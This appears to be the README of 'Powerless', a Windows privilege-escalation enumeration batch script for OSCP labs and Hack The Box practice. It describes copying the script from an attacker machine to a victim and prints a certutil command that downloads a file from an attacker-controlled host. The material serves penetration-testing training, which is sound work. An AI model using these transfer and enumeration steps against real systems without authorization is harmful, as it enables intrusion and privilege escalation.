# Powerless
A Windows privilege escalation (enumeration) script designed with OSCP labs (i.e. legacy Windows machines without Powershell) in mind. The script represents a conglomeration of various privilege escalation checks, gathered from various sources, all done via native Windows binaries present in almost every version of Windows.

Note, the batch file also operates on the latest versions of Windows as well. PowerShell is not necessary to achieve proper OS enumeration.

# Use
Copy the batch file from your attacker machine to a user writeable directory on the victim machine (typically the current users folder, or the "public" user folder will be writeable). 

Also (although the script will run without it), it recommened you copy (an older verison of) AccessChk.exe to the same location. It is recommended you use an older version of AccessChk.exe as the latest verison will not work on some older Windows machines. The archived version here worked well in my experience (thanks, g0tmi1k); https://web.archive.org/web/20080530012252/http://live.sysinternals.com/accesschk.exe

There are many ways to copy over files. I found certutil.exe to be the most reliable across Windows editions. For example;

    certutil.exe -urlcache -split -f "http://$IP/Powerless.bat" Powerless.bat
    
The script may generate a lot of output. My recommended approach is to go through it sequentially making a list of 'interesting' things to look at, sorting them as you go. Once you've reached the end of the output, go through your list in order of what stuck out the most. 

You will do yourself a great disservice if you lean heavily on kernel exploits at the expense of thorough Windows enumeration. Although you may find kernel exploits often in work in the labs, try to find other avenues as well. The script has comments sprinkled throughout to try to provide guidance on what to look for. 

# Recommended OSCP-like Windows Hack The Box machines 
Regretably, the vast majority of HTB Windows machines require kernel exploits for privilege escalation. I found the following machines helpful for practicing priv esc (read, not your typical privilege escalation).

-  Chatterbox
-  Jeeves
-  Access
-  Active
-  SecNotes

# Sources
-  http://www.fuzzysecurity.com/tutorials/16.html
-  https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md
-  https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html
-  https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/
-  https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/
